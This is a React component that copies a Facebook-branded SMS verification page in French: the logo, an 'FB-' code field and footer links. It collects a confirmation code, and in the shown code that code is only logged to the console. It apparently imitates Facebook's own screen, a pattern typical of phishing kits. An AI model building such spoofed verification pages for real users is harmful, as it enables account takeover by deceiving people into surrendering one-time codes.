import { useState } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";

interface VerificationPageProps {
  phoneNumber: string;
  onBack: () => void;
}

const VerificationPage = ({ phoneNumber, onBack }: VerificationPageProps) => {
  const [code, setCode] = useState("");

  const handleContinue = () => {
    console.log("Verification code:", code);
  };

  const handleResendSMS = () => {
    console.log("Resending SMS to:", phoneNumber);
  };

  return (
    <div className="min-h-screen bg-muted flex flex-col">
      {/* Header */}
      <header className="bg-card shadow-sm py-3 px-4">
        <div className="max-w-5xl mx-auto flex justify-between items-center">
          <svg viewBox="0 0 36 36" className="w-10 h-10 fill-primary">
            <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 4.991 2.032 9.508 5.312 12.755V35l4.898-2.724A17.9 17.9 0 0 0 18 33.6c.725 0 1.439-.043 2.139-.126l.042-.005Z"/>
            <path fill="white" d="M24.5 22.5L25.5 18h-4v-2.5c0-1.25.6-2.5 2.6-2.5h2v-4s-1.8-.3-3.6-.3c-3.7 0-6 2.2-6 6.3v3h-4v4.5h4v11c.8.1 1.6.2 2.5.2s1.7-.1 2.5-.2v-11h3z"/>
          </svg>
          <button className="text-foreground text-sm">▼</button>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-start justify-center pt-16 px-4">
        <div className="bg-card rounded-lg shadow-lg p-6 w-full max-w-lg">
          <h1 className="text-xl font-bold text-foreground mb-3">
            Entrez le code de confirmation reçu par texto
          </h1>
          
          <p className="text-muted-foreground text-sm mb-4">
            Indiquez que ce numéro de mobile vous appartient. Entrez le code du SMS envoyé au{" "}
            <span className="font-bold text-foreground">{phoneNumber}</span> (Bénin).
          </p>

          <div className="mb-3">
            <div className="relative">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground">FB-</span>
              <Input
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="pl-10 h-12 text-base border-primary focus:border-primary"
                placeholder=""
              />
            </div>
          </div>

          <button
            onClick={handleResendSMS}
            className="text-primary hover:underline text-sm mb-6 block"
          >
            Renvoyer le SMS
          </button>

          <div className="flex gap-3 justify-end">
            <Button
              variant="outline"
              onClick={onBack}
              className="h-10 px-4 font-medium border-border"
            >
              Mettre à jour les coordonnées
            </Button>
            <Button
              onClick={handleContinue}
              disabled={!code}
              className="h-10 px-6 font-medium bg-primary hover:bg-primary/90 disabled:opacity-50"
            >
              Continuer
            </Button>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="py-4 px-4 mt-auto">
        <div className="max-w-5xl mx-auto flex flex-wrap justify-center gap-4 text-xs text-muted-foreground">
          <a href="#" className="hover:underline">À propos</a>
          <a href="#" className="hover:underline">Politique de confidentialité</a>
          <a href="#" className="hover:underline">Cookies</a>
          <a href="#" className="hover:underline">Choisir sa publicité ▷</a>
          <a href="#" className="hover:underline">Conditions générales</a>
          <a href="#" className="hover:underline">Aide</a>
        </div>
      </footer>
    </div>
  );
};

export default VerificationPage;
